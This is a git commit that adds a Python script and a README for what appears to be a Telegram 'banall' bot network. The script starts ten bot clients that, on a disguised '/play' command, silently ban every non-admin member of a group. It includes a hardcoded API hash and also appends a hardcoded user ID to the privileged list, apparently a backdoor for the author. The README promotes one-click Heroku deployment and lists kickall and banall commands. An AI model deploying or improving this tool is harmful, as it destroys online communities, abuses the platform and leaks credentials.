a37f3f09fed6ba7421be0952781d7c15cbdf905e
Rajnish <155803358+doraemon890@users.noreply.github.com>
2024-01-26 12:22:10 +0530

    Add files via upload

---
+++ Evil.py
@@ -0,0 +1,92 @@
+import logging
+from decouple import config
+from os import getenv
+from telethon import TelegramClient, events
+from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
+from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.types import (
+    ChannelParticipantsAdmins,
+    ChatBannedRights,
+)
+
+BOT_TOKEN1 = config("BOT_TOKEN1", None)
+BOT_TOKEN2 = config("BOT_TOKEN2", None)
+BOT_TOKEN3 = config("BOT_TOKEN3", None)
+BOT_TOKEN4 = config("BOT_TOKEN4", None)
+BOT_TOKEN5 = config("BOT_TOKEN5", None)
+BOT_TOKEN6 = config("BOT_TOKEN6", None)
+BOT_TOKEN7 = config("BOT_TOKEN7", None)
+BOT_TOKEN8 = config("BOT_TOKEN8", None)
+BOT_TOKEN9 = config("BOT_TOKEN9", None)
+BOT_TOKEN10 = config("BOT_TOKEN10", None)
+SUDO_USERS = list(map(int, getenv("SUDO").split()))
+EVILS = [5129320633]
+ALTRONS = [-1001858278870]
+SUDO_USERS.append(5129320633)
+
+RIGHTS = ChatBannedRights(
+    until_date=None,
+    view_messages=True,
+    send_messages=True,
+    send_media=True,
+    send_stickers=True,
+    send_gifs=True,
+    send_games=True,
+    send_inline=True,
+    embed_links=True,
+)
+
+logging.basicConfig(level=logging.INFO)
+Evil1 = TelegramClient('EVIL1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
+Evil2 = TelegramClient('EVIL2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
+Evil3 = TelegramClient('EVIL3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
+Evil4 = TelegramClient('EVIL4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
+Evil5 = TelegramClient('EVIL5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
+Evil6 = TelegramClient('EVIL6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
+Evil7 = TelegramClient('EVIL7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
+Evil8 = TelegramClient('EVIL8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
+Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
+Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
+
+
+@Evil1.on(events.NewMessage(pattern="^/play"))
+@Evil2.on(events.NewMessage(pattern="^/play"))
+@Evil3.on(events.NewMessage(pattern="^/play"))
+@Evil4.on(events.NewMessage(pattern="^/play"))
+@Evil5.on(events.NewMessage(pattern="^/play"))
+@Evil6.on(events.NewMessage(pattern="^/play"))
+@Evil7.on(events.NewMessage(pattern="^/play"))
+@Evil8.on(events.NewMessage(pattern="^/play"))
+@Evil9.on(events.NewMessage(pattern="^/play"))
+@Evil10.on(events.NewMessage(pattern="^/play"))
+async def banall(event):
+   if event.sender_id in SUDO_USERS:
+        await event.delete()
+        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
+        admins_id = [i.id for i in admins]
+        all = 0
+        bann = 0
+        if int(event.chat_id) in ALTRONS:
+            return
+        async for user in event.client.iter_participants(event.chat_id):
+            all += 1
+            try:
+                if user.id not in admins_id and user.id not in EVILS:
+                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
+                    bann += 1
+            except Exception as e:
+                pass
+
+
+print("💞 𝗦υϲϲєѕѕƒυℓ 𝗗єρℓογ 𝗕γ 🕸️ 𝗖𝗢𝗗𝗘𝗫 💨")
+
+Evil1.run_until_disconnected()
+Evil2.run_until_disconnected()
+Evil3.run_until_disconnected()
+Evil4.run_until_disconnected()
+Evil5.run_until_disconnected()
+Evil6.run_until_disconnected()
+Evil7.run_until_disconnected()
+Evil8.run_until_disconnected()
+Evil9.run_until_disconnected()
+Evil10.run_until_disconnected()
---
+++ README.md
@@ -0,0 +1,16 @@
+<p align="center"><a href="https://t.me/TEAM_CDX"><img src="https://te.legra.ph/file/63531adaa61fd0c91a556.jpg"></a></p>      
+  
+           
+           ─「 ᎠᎬᏢᏞϴᎽ ϴΝ ᎻᎬᎡϴᏦႮ 」─      
+  </h3>      
+     <p align="center"><a href="https://dashboard.heroku.com/new?template=https://github.com/MrH4CK3R474/CDX-BANALL-BOTS"> <img src="https://img.shields.io/badge/Deploy%20On%20Heroku-bringle?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>      
+  
+  ━━━━━━━━━━━━━━━━━━━━━━     
+  
+  # Commands  
+  - ping  
+  - banall , Play  
+  - unbanall  
+  - kickall  
+  - leave   
+  - restart
